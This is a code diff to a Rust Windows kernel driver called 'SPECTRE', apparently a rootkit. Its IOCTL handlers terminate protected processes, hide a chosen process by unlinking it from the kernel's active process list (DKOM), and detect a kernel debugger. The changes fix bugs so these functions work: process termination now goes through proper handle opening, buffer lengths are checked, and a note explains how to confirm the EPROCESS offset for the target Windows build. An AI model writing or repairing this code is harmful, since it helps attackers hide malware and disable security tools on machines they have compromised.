@@ -36,9 +36,6 @@ extern "system" {
 
     fn PsGetProcessImageFileName(Process: *mut core::ffi::c_void) -> *mut c_char;
 
-    fn KeAttachProcess(Process: *mut core::ffi::c_void);
-    fn KeDetachProcess();
-
     fn ZwOpenProcess(
         ProcessHandle: *mut HANDLE,
         DesiredAccess: ACCESS_MASK,
@@ -58,7 +55,8 @@ extern "system" {
 // ============================================================
 // Constants
 // ============================================================
-const DEVICE_NAME_UTF16: [u16; 22] = [
+// "\Device\SPECTREDrv" = 18 chars + null terminator = 19
+const DEVICE_NAME_UTF16: [u16; 19] = [
     0x005C, 0x0044, 0x0065, 0x0076, 0x0069, 0x0063, 0x0065,
     0x005C,
     0x0053, 0x0050, 0x0045, 0x0043, 0x0054, 0x0052, 0x0045,
@@ -66,7 +64,8 @@ const DEVICE_NAME_UTF16: [u16; 22] = [
     0x0000,
 ];
 
-const SYMLINK_NAME_UTF16: [u16; 26] = [
+// "\DosDevices\SPECTREDrv" = 22 chars + null terminator = 23
+const SYMLINK_NAME_UTF16: [u16; 23] = [
     0x005C, 0x0044, 0x006F, 0x0073,
     0x0044, 0x0065, 0x0076, 0x0069, 0x0063, 0x0065, 0x0073,
     0x005C,
@@ -184,7 +183,10 @@ unsafe fn dkom_hide_process(pid: HANDLE) -> bool {
 
     if status != STATUS_SUCCESS || eprocess.is_null() { return false; }
 
-    // ActiveProcessLinks offset on Windows 10/11 x64
+    // ActiveProcessLinks offset on Windows 10/11 x64.
+    // NOTE: this offset is build-specific (varies between Windows versions).
+    // Verify against the target build with a symbol dump (e.g. WinDbg:
+    // dt _EPROCESS ActiveProcessLinks) — a wrong offset will corrupt memory.
     const LINKS_OFFSET: usize = 0x448;
     let links_ptr = (eprocess as *mut u8).add(LINKS_OFFSET) as *mut ListEntry;
     let flink = (*links_ptr).flink;
@@ -209,18 +211,47 @@ unsafe fn dkom_hide_process(pid: HANDLE) -> bool {
 // Kill Protected Process
 // ============================================================
 unsafe fn kill_protected(pid: HANDLE) -> bool {
-    let mut eprocess: *mut core::ffi::c_void = core::ptr::null_mut();
-    let status = PsLookupProcessByProcessId(pid, &mut eprocess);
+    // FIXED: do NOT call ZwTerminateProcess with the raw PID.
+    // ZwTerminateProcess requires a real process HANDLE opened with
+    // PROCESS_TERMINATE access — the correct pattern is ZwOpenProcess
+    // (with CLIENT_ID) + ZwTerminateProcess + ZwClose, as in dash_driver.
 
-    if status != STATUS_SUCCESS || eprocess.is_null() { return false; }
+    // Build CLIENT_ID for ZwOpenProcess
+    let mut client_id = CLIENT_ID {
+        UniqueProcess: pid,
+        UniqueThread: core::ptr::null_mut(),
+    };
 
-    KeAttachProcess(eprocess);
-    DbgPrint(b"[SPECTRE] Attached to PID %p \u2014 Killing...\n\0".as_ptr() as *const c_char, pid);
+    // Initialize OBJECT_ATTRIBUTES with OBJ_KERNEL_HANDLE
+    let mut obj_attr: OBJECT_ATTRIBUTES = core::mem::zeroed();
+    InitializeObjectAttributes(
+        &mut obj_attr,
+        core::ptr::null_mut(),   // ObjectName = NULL
+        OBJ_KERNEL_HANDLE,       // Kernel-mode only handle
+        core::ptr::null_mut(),   // RootDirectory = NULL
+        core::ptr::null_mut(),   // SecurityDescriptor = NULL
+    );
 
-    let terminate_status = ZwTerminateProcess(pid as HANDLE, 0);
+    // Open target process with PROCESS_TERMINATE access
+    let mut process_handle: HANDLE = core::ptr::null_mut();
+    let open_status = ZwOpenProcess(
+        &mut process_handle,
+        PROCESS_TERMINATE,
+        &mut obj_attr,
+        &mut client_id,
+    );
 
-    KeDetachProcess();
-    ObfDereferenceObject(eprocess);
+    if open_status != STATUS_SUCCESS || process_handle.is_null() {
+        DbgPrint(b"[SPECTRE] Open failed: PID %p (0x%X)\n\0".as_ptr() as *const c_char, pid, open_status);
+        return false;
+    }
+
+    DbgPrint(b"[SPECTRE] Killing PID %p...\n\0".as_ptr() as *const c_char, pid);
+
+    let terminate_status = ZwTerminateProcess(process_handle, 0);
+
+    // Cleanup: close handle FIRST
+    ZwClose(process_handle);
 
     if terminate_status == STATUS_SUCCESS {
         DbgPrint(b"[SPECTRE] Killed PID %p\n\0".as_ptr() as *const c_char, pid);
@@ -315,7 +346,11 @@ unsafe extern "system" fn device_control_handler(
         // --- Kill Process by PID ---
         IOCTL_KILL_PROCESS => {
             let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u64;
-            if !input_buffer.is_null() {
+            let input_length = (*irp_stack).Parameters.DeviceIoControl.InputBufferLength;
+
+            // FIXED: validate that the caller actually supplied >= 8 bytes
+            // before dereferencing the buffer as u64 (prevents overread).
+            if !input_buffer.is_null() && input_length >= core::mem::size_of::<u64>() as u32 {
                 let pid = *input_buffer as HANDLE;
                 if kill_protected(pid) {
                     information = 1;
@@ -330,7 +365,10 @@ unsafe extern "system" fn device_control_handler(
         // --- Hide Process by PID ---
         IOCTL_HIDE_PROCESS => {
             let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u64;
-            if !input_buffer.is_null() {
+            let input_length = (*irp_stack).Parameters.DeviceIoControl.InputBufferLength;
+
+            // FIXED: validate input length >= 8 bytes (prevents overread).
+            if !input_buffer.is_null() && input_length >= core::mem::size_of::<u64>() as u32 {
                 let pid = *input_buffer as HANDLE;
                 if dkom_hide_process(pid) {
                     information = 1;
@@ -345,7 +383,8 @@ unsafe extern "system" fn device_control_handler(
         // --- Check if Debugger is Present ---
         IOCTL_CHECK_DEBUGGER => {
             let output_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u8;
-            if !output_buffer.is_null() {
+            let output_length = (*irp_stack).Parameters.DeviceIoControl.OutputBufferLength;
+            if !output_buffer.is_null() && output_length >= 1 {
                 *output_buffer = KdDebuggerEnabled;
                 information = 1;
             } else {
